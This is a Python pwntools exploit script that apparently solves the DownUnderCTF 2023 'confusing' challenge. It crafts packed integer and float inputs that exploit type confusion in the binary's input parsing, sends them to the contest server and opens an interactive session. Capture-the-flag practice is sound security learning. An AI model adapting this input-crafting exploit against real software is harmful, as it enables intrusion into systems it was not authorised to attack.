#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2023.ductf.dev --port 30024 confusing
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('confusing')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2023.ductf.dev'
port = int(args.PORT or 30024)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
import struct
d_bytes = struct.pack("<h",13337)
z_bytes = struct.pack("<i",-1)
f_bytes = struct.pack("<d",1.6180339887)
s_bytes = b"FLAG"

d_sent = str(struct.unpack("<d",d_bytes+z_bytes+b"\x00\x00")[0]).encode()
s_sent = str(struct.unpack("<i",s_bytes)[0]).encode()
f_sent = f_bytes
log.info(d_sent)
log.info(s_sent)
log.info(f_sent)
io = start()
io.sendlineafter(b": ",d_sent)
io.sendlineafter(b": ",s_sent)
io.sendlineafter(b": ",f_sent)

io.interactive()

